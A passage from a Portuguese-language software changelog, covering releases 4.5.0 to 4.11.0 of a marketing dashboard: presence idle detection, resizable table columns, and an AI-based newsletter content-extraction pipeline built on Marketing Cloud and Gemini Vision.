- Slots existentes sem `projectId` migram pra "Geral · Conteúdo" no primeiro acesso
- URL antiga `#content-calendar` continua válida (mostra empty state em vez de calendário global)
- Função `account` mantida — só muda de scope-principal pra filtro-secundário

### Arquivos alterados
- `js/services/contentCalendar.js` — +85 linhas (migration + filter)
- `js/pages/contentCalendar.js` — +120 linhas (selector, URL state, empty state, modal banner, convert-to-task)
- `js/version.js` — bump 4.10.0 → 4.11.0
- `index.html` — cache-bust v= alinhado


## [4.10.0+20260507-presence-idle-detection] — 2026-05-07

Release **MINOR** — presence agora distingue **ativo** vs **ausente** (inatividade real).

### Problema reportado pelo user
> "se eu abro o sistema, ele me deixa como online, mas o ideal é medir inatividade para entender se user realmente esta on line, né?"

A implementação anterior só validava "aba aberta" (heartbeat a cada 2min). Se o user abria o sistema e ia pegar café 1h, continuava aparecendo como online — gerando ruído na lista de "Usuários on-line".

### Solução

Detecção de inatividade real via 2 sinais:
1. **Eventos de interação** — `mousedown`, `mousemove`, `keydown`, `scroll`, `touchstart`, `wheel`, `click` (capture phase, throttled a 1s)
2. **Visibilidade da aba** — `document.visibilitychange`: aba escondida → idle imediato; visível → reset

State derivado a cada heartbeat:
- `document.hidden === true` → `'idle'`
- `now - lastActivity > 5min` → `'idle'`
- caso contrário → `'active'`

Heartbeat adaptativo:
- Active: 2 min (igual antes)
- Idle: 5 min (-60% writes quando ausente)
- Skip writes redundantes quando state não mudou e dentro da janela
- Transição idle → active força um heartbeat imediato pra UI atualizar rápido

Doc presence agora tem `state: 'active' | 'idle'` + `lastActivityAt` (ms timestamp). Listener separa em `store.onlineUsers` (ativos) e `store.idleUsers` (ausentes).

### Header UI

- Resumo dinâmico: "5 ativos · 2 ausentes" (em vez do antigo "Usuários on-line:")
- Avatares dos ativos com bolinha verde (#22C55E), opacity 1.0
- Avatares dos ausentes com bolinha amarela (#F59E0B), opacity 0.7
- Tooltip mostra o status: "● ativo agora" ou "● ausente há X min"
- Dropdown "+N" agrupa por seção: 🟢 Ativos / 🟡 Ausentes

### Custos

Para 200 users com ~30% idle a qualquer momento:
- Antes: 200 × 720 = 144k writes/dia
- Agora: 140 × 720 + 60 × 288 = ~118k writes/dia (-18%)

### Arquivos alterados
- `js/services/presence.js` — refatoração completa (rewrite, +60 linhas)
- `js/components/header.js` — UI separa active/idle, tooltip + dropdown atualizados
- `js/version.js` — bump 4.9.3 → 4.10.0
- `index.html` — cache-bust v= alinhado


## [4.9.3+20260506-fix-resize-disparos-envios] — 2026-05-06

Release **PATCH** — corrige 2 problemas reportados pelo user nas tabelas:

1. *"a primeira [Disparos] está com colunas em que as palavras aparecem cortadas"* — tabela **Disparos** (aba Performance) agora tem resize-handles em **todas** as colunas, larguras default mais generosas, e botão "↺ Reset colunas".
2. *"a outra [Envios] deixou a coluna C vinculada a B, criando um aspecto estranho, desajeitado"* — bug no resize da tabela **Envios** (aba Conteúdo) corrigido. O drag de uma coluna fazia as colunas vizinhas "se moverem junto" porque o handler usava `getBoundingClientRect().width` para capturar widths de TODAS as colunas no `mouseup` (e o browser distribuía espaço extra entre cols sem width explícita devido a `width:max-content` + `min-width:100%`).

### Bugfix Envios (`renderEnrichedSendsList` + `wireEnviosColResize`)
- `<table style="width:max-content;min-width:100%">` → `<table style="width:${totalW}px">` (largura explícita = soma das cols, scrollada pelo wrapper).
- `wireEnviosColResize` agora mantém um `state[]` de larguras explícitas por coluna. No `mousemove` atualiza só o índice arrastado, no `mouseup` salva esse mesmo array — não captura widths renderizadas via `getBoundingClientRect`.
- Adicionado `document.body.style.cursor = 'col-resize'` durante o drag.

### Resize tabela Disparos (`renderTable`)
- Substituídas as 3 colunas sticky (BU, Data, Nome) + 11 scroll-cols por uma única `<table>` com `<colgroup>` + `table-layout:fixed`.
- Definição declarativa em `DISPAROS_COLS_DEFINITION` (15 cols com defaults entre 40 e 280px e `visibleWhen` para edit/filterBu).
- Persistência por chave em `localStorage[nl-disparos-col-widths-v1]` (objeto `{key: width}` em vez de array — sobrevive a mudanças de visibilidade).
- Botão "↺ Reset colunas" no topo da tabela com `_resetDisparosColWidths()`.
- Helper `_renderDisparosCell(col, r, hidden)` — render baseado em `col.type` (date, name, subject, num, num-bad, pct-good, edit, bu).
- `loadData` atualizado pra usar `nl-table-wrap` direto (sem `nl-tbody`).

### Trade-offs
- Sticky-cols removidas — resize + sticky era complexo (sticky `left` precisa recomputar com cada drag). User prioriza resize, scroll horizontal é a alternativa.
- Resize não preserva `editMode` toggle widths separadamente (compartilha mesma key, recompute na hora).

### Arquivos alterados
- `js/pages/nlPerformance.js` — refactor renderTable + bugfix wireEnviosColResize
- `js/version.js` — bump 4.9.2 → 4.9.3
- `index.html` — cache-bust v= alinhado


## [4.9.2+20260506-modal-chips-resize-cols] — 2026-05-06

Release **PATCH** — atende as 2 últimas observações do user sobre a aba **Conteúdo & Temas**:

1. *"qdo abro o form pra editar a info, ainda tem muita coisa com estilo desenvolvimento. precisamos de coisas prontas para o usuario final"* — modal "✎ Editar análise" totalmente reformulado. Sem JSON exposto, sem textareas. Substituído por:
   - **Chip-inputs** com auto-complete via `<datalist>` para arrays de strings (Países, Cidades, Marcas, Temas, Público-alvo, Atividades, Argumentos de venda).
   - **Object-list editors** (3 inputs por linha + botão remover + botão "+ Adicionar") para Hotéis e Cruzeiros (que têm `name`/`brand`/`category`).
   - Selects amigáveis com labels descritivos para `confiança` ("Alta — IA + manual confirmado").
   - Sugestões pré-curadas (38 países, 38 cidades, 20 marcas tier-1/luxo, 12 temas canônicos, 9 audiências, 12 atividades).
   - Tooltips ⓘ por seção explicando o que entra em cada campo.

2. *"a coluna unidade está cortando as palavras, e a de nome está muito grande para o texto atual. poderia ser interessante o usuario manipular isso"* — tabela de envios agora tem **colunas redimensionáveis pelo usuário**:
   - Cada `<th>` ganha um drag-handle de 6px na borda direita. Mouse-down → arrasta → solta.
   - Larguras persistidas em `localStorage[nl-content-envios-col-widths-v2]` por usuário/browser.
   - Botão "↺ Reset colunas" no topo restaura defaults [88, 260, 160, 200, 160, 70, 60].
   - `table-layout:fixed` + `<colgroup><col>` garantem que widths são respeitados.
   - `title=""` em cada `<td>` mostra o conteúdo completo no hover quando há truncate.

### Implementação

#### Modal (`js/pages/nlPerformance.js`)
- Constante `SUGGEST` com listas pré-curadas (countries, cities, themes, brands, etc.).
- `createChipInput(initial, opts)` — componente genérico de chip-input com Enter/vírgula para adicionar, Backspace para remover último, suporte a `<datalist>`.
- `createObjectListEditor(initial, categories, opts)` — editor de array de `{name, brand, category}` com 3 inputs por linha + botão remover + "+ Adicionar".
- `openExtractedEditor()` totalmente reescrita: layout de cards/seções com tooltips, sem nenhum JSON visível.

#### Resize de colunas (`js/pages/nlPerformance.js`)
- `_loadEnviosColWidths()` / `_saveEnviosColWidths()` para persistência.
- `wireEnviosColResize()` chamado dentro de `wireDrillDowns()`.
- Drag handler com `mousedown` → `mousemove` listener temporário no document → `mouseup` → save.
- Idempotente via `dataset.wiredResize`.

### Arquivos alterados
- `js/pages/nlPerformance.js` — modal completamente reescrito + resize de colunas (~+250 linhas)
- `js/version.js` — bump 4.9.1 → 4.9.2
- `index.html` — cache-bust v= alinhado


## [4.9.1+20260506-nl-content-insights-tooltips] — 2026-05-06

Release **PATCH** — atende 2 observações do user sobre a aba **Newsletter → Conteúdo & Temas**:

1. *"todos os cards tem que ter um 'i' explicando o critério de selecao feito pela IA"* — tooltip "ⓘ" em **todos** os 6 KPIs e nos 9 cards/blocos explicando o critério de extração (dicionário curado de keywords, dedup intra-doc, regex no subject por tipo, triggers por tema, etc.).
2. *"falta implementar insights em todas as abas (acho q só tem em 1)"* — **Insights & Observações** agora também na aba **Conteúdo & Temas** (antes existia só em Performance e Calendário). 10 widgets ancorados (`contentKpis`, `newsletterTypes`, `topCountries`, `topCities`, `topHotels`, `topCruises`, `themes`, `brands`, `contentByBu`, `enrichedSends`) + painel "Análise Geral" com snapshot agregado.

### Implementação

#### Tooltips (`js/pages/nlPerformance.js`)
- Constante `INFO_TIPS` (15 keys) — texto canônico do critério IA por bloco/KPI.
- Helper `blockHeader(title, tooltip, widgetId)` — renderiza header com badge ⓘ + slot de insights opcional.
- Helper `contentKpi(title, value, sub, tooltip)` — adiciona ⓘ flutuando no canto direito do KPI.
- Aplicado em **6 KPIs** (Países, Cidades, Hotéis, Cruzeiros, Marcas, Open rate) e **9 blocos** (Tipo, Top países/cidades/hotéis/cruzeiros, Temas, Marcas, Por BU, Envios).

#### Insights na aba Conteúdo (`js/pages/nlPerformance.js`)
- 8 funções snapshot: `buildNlContentKpisSnapshot`, `buildNlContentTypesSnapshot`, `buildNlContentCountriesSnapshot`, `buildNlContentCitiesSnapshot`, `buildNlContentHotelsSnapshot`, `buildNlContentCruisesSnapshot`, `buildNlContentThemesSnapshot`, `buildNlContentBrandsSnapshot`, `buildNlContentByBuSnapshot`, `buildNlContentSendsSnapshot`.
- `buildNlContentGeneralSnapshot()` — snapshot agregado com totais + top-5 de cada dimensão para o painel geral.
- `setupNlContentInsights(enrichedDocs, agg)` — monta widgets via `setupDashboardInsights({...})`. Chamado dentro de `renderContentTab()` (re-monta a cada render — slots zeram quando `innerHTML` é reescrito).
- Período do `setupDashboardInsights` deriva de `_contentFiltersState.period` (default 180 dias). Filtros propagados: bu/country/city/theme/newsletterType/search.

### Arquivos alterados
- `js/pages/nlPerformance.js` — tooltips + insights setup completo (~+200 linhas)
- `js/version.js` — bump 4.9.0 → 4.9.1
- `index.html` — cache-bust v= alinhado

### Verificação
- Sintaxe JS validada (`node --check`).
- Compatível com `setupDashboardInsights` API (já usada em Performance + Calendar).
- IA Hub não precisa de mudanças — `dashboard='nl'` já cobre as 3 abas via `indexKey`.


## [4.9.0+20260506-schema-cruises-newslettertype-cidades-edit-modal] — 2026-05-06

Release **MINOR** — atende 5 observações cirúrgicas do user sobre a aba de Conteúdo & Temas:
1. *"se um hotel é citado mais de uma vez na mesma newsletter, ele ganha apenas uma citação"* — dedup intra-doc via `Set`
2. *"importante entender qual o critério para temas/posicionamento"* — critérios canônicos documentados em RULES § 10.5b
3. *"saiba diferenciar hotel de cruzeiro (ex: acqua expeditions)"* — schema **separado** `cruises[]` ≠ `hotels[]`, com bloco UI próprio
4. *"ter a opcao de editar a lista que vc fez para termos 100% de efetividade"* — botão **✎ Editar** + modal completo de edição manual
5. *"outro topico importante de analise: tipo da newsletter (se é promocao, áereo, roteiro, hotelaria)"* — novo campo `newsletterType` enum (10 valores) com KPI/filtro/bloco
6. *"ah, faltou ter analise por cidade/regiao... e nao só país"* — novo bloco "Top cidades/regiões" + KPI + filtro + drill-down

### Schema novo (`mc_performance.extracted`)
- **`cruises[]`** — array separado de operadoras marítimas (Aqua Expeditions, Silversea, Ritz-Carlton Yacht, Delfin Amazon). NÃO devem aparecer em `hotels[]`.
- **`newsletterType`** — enum com 10 valores: `promocao | aereo | roteiro | hotelaria | cruzeiro | csat | inspiracional | institucional | show/evento | retreat/wellness`. Documentado com critério canônico em RULES § 10.5b.

### UI atualizada (aba "🌍 Conteúdo & Temas")
- **6 KPIs no topo**: Países · Cidades (NOVO) · Hotéis · Cruzeiros (NOVO) · Marcas · Open Rate Médio
- **7 blocos** (era 4): Tipo de newsletter (NOVO) · Top países · Top cidades/regiões (NOVO) · Top hotéis · Cruzeiros (NOVO) · Temas · Marcas
- **Filtros expandidos** (de 4 pra 7): BU · Período · **Tipo (NOVO)** · País · **Cidade (NOVO)** · Tema · Busca
- **Drill-down por cidade** (era só por país)
- **Coluna "Editar"** na tabela de envios com botão ✎ → modal de edição manual
- **Badge tipo de newsletter** ao lado do nome de cada envio

### Modal de edição manual (`openExtractedEditor`)
- Form com selects (newsletterType, confidence, pricePoint) + textareas (1 entidade por linha) pra todos os 11 campos do schema
- Hotels/Cruises aceitam JSON inline `{"name":"X","brand":"Y","category":"luxo"}` por linha
- Salva direto em Firestore com `extractedBy: 'manual-edit'` + `editedAt`
- Cache invalidado automaticamente após save
- Garantia: master pode corrigir 100% das análises onde IA errou

### Documentação (RULES § 10.5b)
Reescrita completa da seção de Newsletter Performance Enriquecimento:
- Pipeline atual (Vision-first 4.8.0+)
- Schema canônico de `extracted` documentado
- **Tabela de critérios de tipo** (10 categorias com triggers)
- **Tabela de critérios de tema** (13 categorias com triggers)
- Regras de dedup (intra-doc + inter-wave)
- Cruises separados de hotels (regra explícita)
- Quando re-rodar (workflow_dispatch, edição manual, ENRICH_DISABLED)

### Why
Observações cirúrgicas de domínio que IAs gerais não pegam:
- Aqua Expeditions é cruzeiro fluvial (Mekong/Amazônia), não hotel — mas IA classificava como hotel
- Cidades importam tanto quanto países pra curadoria (Atenas vs Grécia, Cumbuco vs Brasil)
- Tipo de newsletter (promo vs hotelaria vs aéreo) é dimensão crítica pra entender o portfolio
- Edição manual é INDISPENSÁVEL quando se cobra de cliente — IA erra, humano corrige
- Critérios documentados evitam que próxima IA invente categorias novas a cada extração

### Verificação
1. ✓ `node --check` passou
2. ⏳ Bulk write (159 campanhas) — pendente browser reconectar
3. ⏳ Validação visual da nova UI

### Próximas releases planejadas
- **4.9.x — Bulk write das 159 campanhas analisadas por Claude Sonnet** (pendente)
- **4.10.0 — PDF + relatórios cruzados** (sazonalidade, top hotéis × performance, alinhamento subject↔body)

---

## [4.8.1+20260505-conteudo-separado-por-bu] — 2026-05-05

### Changed
- (descreva aqui as mudanças deste deploy)

---

## [4.8.0+20260505-vision-first-gemini-extraction] — 2026-05-05

**Pivot fundamental do enrichment.** Reportado: *"NAOOO... descricao fizemos só em alguns casos como exemplo!"* + *"muitas news tem html apenas no header e no footer. vai ter que analisar textos dentro de imagens, né? o miolo esta em img..."*. Diagnóstico anterior estava errado — tanto a ideia de description manual quanto extração via texto stripped (que só pega rodapé legal). Único caminho: **Vision API** lendo as imagens dos emails.

### Changed (arquitetura inteira do extract)
- **Agente IA Hub atualizado**: `provider: 'groq'` → **`'gemini'`**, `model: 'llama-3.3-70b-versatile'` → **`'gemini-2.5-flash'`**. System prompt reescrito pra extração multimodal (imagens + contexto textual). `name`: "Extrator de Conteúdo de Newsletter (Vision)". `maxTokensPerRun: 2000`, `timeoutMs: 60000`.
- **`extractEntitiesViaAgent` refatorada** — assinatura passa a aceitar objeto `{html, text, subject, name}` em vez de só `text`. Detecta `provider === 'gemini' && html` → fluxo Vision.

### Added (pipeline Vision-first)
- **`extractContentImages(html, topN=5)`** — extrai URLs de `<img>` do HTML cru com filtros:
  - Pula tracking pixels (1×1, gif analytics)
  - Pula spacers (<10px)
  - Pula logos (<200×<100)
  - Score por área × bonus de alt-text descritivo
  - Dedup por URL, retorna top N por score
- **`fetchImageAsBase64(url)`** — download HTTP da imagem, valida content-type, limita 5MB, retorna `{mimeType, data: base64}`. User-Agent custom.
- **`callGeminiVision(model, apiKey, sysPrompt, userPrompt, images, ...)`** — endpoint Gemini 2.5 Flash multimodal: `inlineData: {mimeType, data}` por imagem. Up to 5 imgs num único request. `responseMimeType: 'application/json'`.
- **Cache por URL de imagem** em nova collection `mc_image_extractions`:
  - Doc id = `sha256(url)`
  - Fields: `{url, extracted, ts}`
  - Cache hit: usa extracted antigo, não re-baixa imagem nem re-chama Vision
  - Insight: hotéis populares (Faena, Aman) reaparecem em múltiplas campanhas → hit rate alto após poucos runs
- **Prompt enriquecido** combina: contexto textual (subject + name + alt-texts) + cache de imagens já analisadas + imagens novas. Modelo cross-valida contexto vs Vision.

### Why
1. **Description não escala**: usuário confirmou que só foi preenchida em casos isolados como teste. Não é fonte confiável.
2. **HTML stripped só dá rodapé**: template SFMC tem header (logo) + footer (telefone, disclaimer legal) em texto. O conteúdo real (banners de hotel, cards de oferta, preços) está em `<img>` no meio.
3. **Vision via Gemini é cheap**: ~$0.0002/email, ~R$ 7/ano operação anual completa. Cache derruba mais ainda.
4. **Gemini key já configurada**: zero ação do usuário pra ativar (key em `system_config/ai-config.geminiApiKey`).

### Custo recalculado
| Operação | Volume típico | Custo USD | BRL |
|---|---|---|---|
| Backfill 90d (sem cache imgs) | 150 emails × 3-5 imgs avg = 600 calls | ~$0.05 | R$ 0.30 |
| Daily incremental | 10 emails × 3 imgs avg = 30 calls | ~$0.003/dia | R$ 0.02 |
| **1 ano com cache** (hotéis recorrentes) | ~3000 imgs únicas no ano | ~$1.10 | **~R$ 7** |

### Verificação
1. ✓ `node --check` passou
2. ✓ Agente atualizado em `ai_agents/{slug}` com provider gemini + prompt vision
3. ⏳ Workflow_dispatch após deploy: validar logs `🖼 N imgs Vision (M cache img)`
4. ⏳ Inspecionar 1-2 docs `mc_performance` recentes — `extracted.hotels`, `countries`, `cities` populados COM dados reais (não mais empty arrays do Llama)
5. ⏳ Aba Conteúdo & Temas → KPIs e blocos com **dados ricos de verdade**

### Schema novo: `mc_image_extractions`
- `{id (sha256 url), url, extracted, ts}` — collection de cache de extração por imagem
- Útil pra debug: olhar quais imagens foram analisadas e o que cada uma rendeu
- Tamanho médio: ~2kb/doc; pra 3000 imgs únicas/ano = 6MB. Trivial.

### Próximas releases planejadas
- **4.8.x — Tunning de prompt baseado em resultados reais** (após primeiro batch de Vision)
- **4.9.0 — PDF da aba Conteúdo + relatórios cruzados** (sazonalidade, top hotéis × performance)

---

## [4.7.0+20260505-wave-dedup-content-htmltext-dump] — 2026-05-05

Reportado: *"Lembre-se: muitos disparos tem o mesmo codigo (PXXX, por exemplo), pq disparamos em ondas, dividindo o mailing. isso precisa estar no seu racional de analise de termos"* — necessidade crítica de dedup por campanha pra contagem de hotéis/destinos não inflar artificialmente. Também: *"eu gostaria que vc fizesse e analisasse os docs... pq a IA do sistema é muito fraca"* — preparação pra re-extração manual via Claude.

### Added (Wave dedup)
- **`dedupContentByCampaign(docs)`** em `nlPerformance.js` aba Conteúdo: agrupa docs com mesmo `baseCode` (P0209_1/_2/_3 → P0209). Mantém doc canônico (com extracted preenchido) + agrega métricas de performance (totalSent, openRate, clickRate). Critical pra que "Hotel X mencionado em P0209" não vire "3 mentions" só porque o mailing foi dividido.
- **Reusa lógica `baseCode()`** existente no `mergeWaves` (linhas 451-460): strip de sufixos `_N`, `-N`, `_X`. Mesmo critério da aba Performance.
- **Badge `⊞N` na tabela de envios** mostra contagem de ondas se >1.
- **Counter atualizado**: agora mostra "X campanhas (Y disparos) no período" em vez de só "Y disparos" — comunica explicitamente a deduplicação.

### Added (htmlText dump)
- Campo novo `mc_performance.htmlText` (string, até 10k chars do HTML stripped). Salvo automaticamente pelo `mc-sync.js` durante enrichment. Custo: +10kb/doc × ~50 docs = 500kb. Trivial.
- Permite re-extração manual sem refazer fetch SFMC. Útil quando:
  - User quer revisar/auditar o que a IA extraiu vs o conteúdo real
  - Trocar modelo (Llama → Claude Sonnet) e re-rodar extração nos docs antigos
  - Análise manual ad-hoc (Claude no chat lê e extrai melhor que Llama 70B)

### Why
**Wave dedup** corrige ruído na análise — sem ele, qualquer destaque de "Hotel X é o mais mencionado" estaria distorcido pelo número de ondas, não por relevância real do produto.

**htmlText dump** desbloqueia re-análise sem custo de fetch. Fundamental dado que o user vai trocar pra modelo melhor (Claude Sonnet quando adquirir API paga) e queremos re-extrair os ~150 docs históricos sem refazer todo o sync SFMC. Custo de storage é trivial.

### Verificação
1. Rodar workflow_dispatch após este deploy → docs ganham `htmlText` populado
2. `#nl-performance` → aba "🌍 Conteúdo & Temas" → counter mostra "N campanhas (M disparos)" — N < M se houver waves
3. Hotéis citados: cada campanha conta 1 vez (não inflado por waves)
4. Cards de envios mostram badge ⊞N quando aplicável

### Próximas releases planejadas
- **4.7.x — Re-extração manual via Claude (quando user adquirir API paga)**: troca o agente IA Hub `provider: 'groq'` → `'anthropic'`, modelo `'claude-haiku-4-5'` ou `'claude-sonnet-4-6'`. Re-roda extração nos docs com `htmlText` populado. Sem custo SFMC.
- **4.8.0 — PDF da aba Conteúdo + relatórios cruzados** (sazonalidade, hotéis subutilizados).

---

## [4.6.2+20260505-fix-rate-limit-serial-retry] — 2026-05-05

Hotfix do throughput. Após o **breakthrough da 4.6.1** (match Send→Asset por NOME, recuperando 18/18 assets), o Groq tier on-demand retornou 429 em 10 das 18 chamadas LLM por TPM (12k tokens/minuto) excedido.

### Fixed
- **Concorrência reduzida 4 → 1** (serial). HTML de marketing emails tem ~5k tokens, então 4 paralelas estouravam o TPM Groq facilmente.
- **Truncate de input 8000 → 5000 chars** (~1.5k tokens). Marketing emails são repetitivos: as primeiras seções já trazem destinos/hotéis/temas. Reduz token spend em ~38% sem perda significativa de qualidade.
- **Retry inteligente**: parse do `try again in X.XXXs` da resposta Groq pra calcular backoff exato em vez de 2s fixo. Se rate limit pede 25s, espera 25.5s.
- **Retries: 1 → 3**. Permite atravessar múltiplos rate limits seguidos numa única run.

### Why
4 paralelas × 5k tokens = 20k tokens em rajada vs limite 12k/min. Serial leva ~1-2s/email; pra 30-50 emails/dia ainda termina em <2min total. Trade-off aceitável.

### Verificação
- ⏳ Re-trigger workflow_dispatch — esperado: `0 falhas` em vez de `10`

---

## [4.6.1+20260505-fix-asset-query-fields-syntax] — 2026-05-05

Hotfix capturado em primeiro workflow_dispatch após user habilitar permissão `Assets > Read` no SFMC. SFMC aceitou autenticação (saiu de 403 → 400), mas rejeitou o `fields` parameter por dot-notation: `views.html.content is not a valid field argument`.

### Fixed
- **`scripts/mc-sync.js fetchAssetsByLegacyIds`**: removido o array `fields` do POST query. SFMC asset API não aceita dot-notation em `fields` (errorcode 10005). Solução: omitir o parâmetro inteiro — API retorna payload completo. Trade-off aceitável: response maior, mas pra ~10 assets/dia o tráfego é trivial.
- **HTML extraction com fallback**: alguns assets podem ter conteúdo em `views.html.content`, outros em `content` direto, ou ainda `views.text.content` (text-only). Tentamos os 3 em ordem.

### Why
Documentação SFMC asset API é vaga sobre o suporte a dot-notation no `fields`. Tentei conforme exemplos antigos achados online, falhou. Omitir é a abordagem mais robusta — payload extra é desprezível.

### Verificação
- ✓ `node --check` passou
- ⏳ Re-trigger workflow — esperado ver `N assets recuperados` em vez de `0` + `M chamadas LLM`

---

## [4.6.0+20260505-aba-conteudo-temas-newsletter] — 2026-05-05

**Fase 2 do projeto enriquecimento de newsletters.** Entrega a aba **"🌍 Conteúdo & Temas"** no `#nl-performance` consumindo `mc_performance.extracted` (entidades extraídas via IA na Fase 1, releases 4.5.0-4.5.2). Adiantada enquanto o Marketing Cloud está fora do ar — assim que o sync rodar com `Assets > Read` ativo no SFMC, a UI já vai estar pronta consumindo os dados reais.

### Added
- **Nova tab "🌍 Conteúdo & Temas"** em `#nl-performance` (entre Calendário e Performance):
  - **5 KPIs**: países distintos · hotéis citados · marcas · open rate médio · confiança IA (high count)
  - **Bloco "🌍 Top destinos · performance"** — tabela ordenada com país, count de disparos, open rate (color-coded). Clique em linha = drill-down: filtro de país aplicado e re-renderiza tudo.
  - **Bloco "🏨 Hotéis mais mencionados"** — top 10 com bar chart horizontal proporcional.
  - **Bloco "🎯 Temas / posicionamento"** — todas categorias (luxo, romance, família, etc.) com count + open rate por tema. Permite ver quais temas convertem mais.
  - **Bloco "🏷 Marcas hoteleiras"** — pills com count (Belmond, Aman, Four Seasons, etc.).
  - **Tabela "📧 Envios"** — últimos 50 disparos enriquecidos com: data, nome, países, hotéis (top 2 + count), temas (top 3), open rate.
- **Filtros transversais**: BU, período (30/90/180/365/all), país, tema, busca textual. Dropdowns de país e tema **populados dinamicamente** com base nos dados reais.
- **Empty state inteligente** quando nenhum doc tem `extracted`: explica se é falta de dados (sync não rodou) OU permissão SFMC ausente OU agente IA inativo. Links diretos pra GH Actions e IA Hub.
- **Cache em memória** (`_contentDataCache`) — fetch único pra todos os toggles de filtro. Botão "↻ Atualizar" força refetch.

### Changed
- Tab navigation handler atualizado pra suportar 3 tabs: Performance · Calendário · Conteúdo & Temas.
- `loadContentTab()` é lazy-loaded — só carrega Firestore na primeira vez que user clica na tab.

### Why
Sem UI consumindo o `extracted`, o trabalho da Fase 1 ficaria invisível. Mesmo com o MC fora do ar agora (impossibilitando teste end-to-end), entregar a UI pronta significa que basta o sync rodar 1× pra tudo aparecer. Mantém o ritmo de entrega + permite revisar layout antes de ter dados (UX no vácuo é ruim, então fiz com empty states ricos que já são úteis).

### Pendências (independentes desta release)
1. ⏳ SFMC: liberar `Assets > Read` no Installed Package
2. ⏳ Re-trigger workflow_dispatch após (1)
3. ✅ Aba pronta consumindo o que vier

### Próxima release
**4.7.0 — Fase 3**: PDF export da aba Conteúdo + relatórios cruzados (sazonalidade, hotéis subutilizados, alinhamento subject↔body).

### Verificação
1. Acessar `#nl-performance` → ver 3 tabs no topo
2. Click "🌍 Conteúdo & Temas" → empty state aparece (sem dados ainda)
3. Empty state deve dizer "X disparos no período mas 0 enriquecidos" + links pra GH Actions e IA Hub
4. Ao primeiro doc com `extracted` chegar via sync → KPIs + 4 blocos + tabela renderizam automaticamente

---

## [4.5.2+20260505-fix-soap-email-id-nested] — 2026-05-05

Hotfix capturado em teste in-browser do workflow_dispatch da 4.5.1: SOAP do SFMC retornou `Error: The Request Property(s) EmailID do not match with the fields of Send retrieve`. O nome correto da property é `Email.ID` (sub-property aninhada do objeto Send).

### Fixed
- **SOAP property `EmailID` → `Email.ID`** em `scripts/mc-sync.js`. O SFMC SOAP partner API expõe o EmailID como sub-property nested do objeto Send, não como property direta.
- **Parser de XML ajustado**: `Email.ID` retorna como `<Email><ID>37396</ID></Email>` no envelope SOAP. Adicionei extração nested via regex `<Email>...</Email>` → captura `<ID>` interno.

### Why
SFMC SOAP é particular sobre dot-notation em properties. Documentação não é cristalina, eu errei na primeira tentativa. Capturado rapidamente porque o GH Action falhou logo no primeiro fetch (status `0 sends encontrados` com erro explícito) — proteção do `if (!sends.length) continue` evitou que o sync inteiro travasse.

### Verificação
- ✓ `node --check` passou
- ⏳ Re-trigger workflow_dispatch — esperado: `N sends encontrados` em vez de `0`

---

## [4.5.1+20260505-ia-hub-agent-newsletter-extractor] — 2026-05-05

**Pivot arquitetural** sobre a 4.5.0. Reportado: *"o certo nao é usar o IA Hub como modulo parceiro dessa solucao? assim temos o agente registrado, com maior visibilidade e possibilidade de manutencao no front. e mais: podemos escolher o modelo pra trabalhar."* — observação cirúrgica que mata o approach hardcoded da 4.5.0 e amarra o pipeline ao módulo IA Hub que já tem governança (audit, budget, key cascade, UI de gestão).

### Changed
- **`scripts/mc-sync.js` refatorado pra usar agente registrado**:
  - Provider, modelo, prompt e limites lidos de `ai_agents` (Firestore). **Trocar modelo agora é editar campo no agente, sem deploy.**
  - Chave de API resolvida de `system_config/ai-config` (mesmo doc que `js/services/ai.js` lê — single source of truth).
  - Multi-provider implementado: anthropic, groq, openai, gemini.
  - Logs em `ai_usage_logs`: cada extração registra `agentId, provider, model, source: 'mc-sync', tokensIn, tokensOut, success, durationMs`. Visível no dashboard da IA Hub.
  - Falha graceful em 5 níveis: agente ausente / agente inativo / sem chave / sem HTML / parse JSON falhou.
- **Workflow `mc-sync.yml`**: removido `ANTHROPIC_API_KEY` env. Chave vem de Firestore.

### Added
- **Agente "Extrator de Conteúdo de Newsletter"** seedado em `ai_agents`:
  - `slug: 'newsletter-content-extractor'`
  - `provider: 'groq'`, `model: 'llama-3.3-70b-versatile'`
  - `module: 'nl-performance'`
  - `outputFormat: 'json'`, `limits.temperature: 0`
  - `visibility.mode: 'admin'`, `invokedBy: ['mc-sync GitHub Action']`
- **Schema `mc_performance.extracted`** ganha `agentId`, `agentSlug` e `extractedBy: 'groq/llama-3.3-70b-versatile'` (dinâmico vs hardcoded da 4.5.0).

### Why
A 4.5.0 entregou fundação técnica certa mas arquitetura de provider hardcoded — péssima prática num sistema que já tem IA Hub funcional. **Pivot ganha:**
1. Visibilidade: agente aparece no `#ai-hub` junto com outros — admin vê custo, erro, prompt, modelo num só lugar
2. Manutenção sem deploy: trocar modelo (Llama→Sonnet→Gemini) é click; ajustar prompt é editar campo
3. Governança: audit log, budget alert, rate limit, key cascade — tudo já existe na IA Hub
4. Reuso: futuras extrações similares seguem o mesmo padrão

**Por Groq Llama 3.3 70B:** chave já em `system_config` (zero ação user), JSON mode nativo, custo ~R$ 15/ano (vs ~R$ 30 com Haiku), latência ~1-2s. Pode trocar pra qualquer outro provider editando o agente.

### Verificação
1. ✓ Agente criado em `ai_agents` com `slug: 'newsletter-content-extractor'`
2. ✓ `system_config/ai-config.groqApiKey` confirmado (key real, len 56)
3. ✓ `node --check scripts/mc-sync.js` passou
4. ⏳ Trigger workflow_dispatch `days=7`: validar logs `Enriquecimento IA: ✓ ATIVO via agente "Extrator de Conteúdo de Newsletter" (groq/llama-3.3-70b-versatile)`
5. ⏳ Inspecionar `mc_performance` docs recentes — `extracted` + `agentId` + `extractedBy` populados

### Pré-requisito SFMC ainda válido
Permissão `Assets > Read` no Installed Package SFMC. Se 401/403 nos logs, configurar conforme 4.5.0.

### Próxima release
**4.6.0 — Fase 2**: aba "Conteúdo & Temas" no `#nl-performance` consumindo `mc_performance.extracted`.

---

## [4.5.0+20260505-mc-sync-html-ia-extracao] — 2026-05-05

Release **MINOR** — Fase 1 do enriquecimento de newsletters por IA. O sync diário do Marketing Cloud passa a puxar o **HTML completo** de cada disparo (via REST `/asset/v1/content/assets/query`) e extrai entidades via Claude Haiku 4.5: países, cidades, hotéis, marcas, temas, target audience, atividades, faixa de preço, sales points. Tudo persistido em `mc_performance.extracted`. Pipeline com cache por `htmlHash` pra zero re-trabalho.

Esta é a fundação de dados. **Fase 2** entrega a UI (nova aba "Conteúdo & Temas" no `#nl-performance`); **Fase 3** entrega relatórios cruzados e PDF. Ambas dependem desta release rodar em produção.

### Added
- **`scripts/mc-sync.js`** — funções novas:
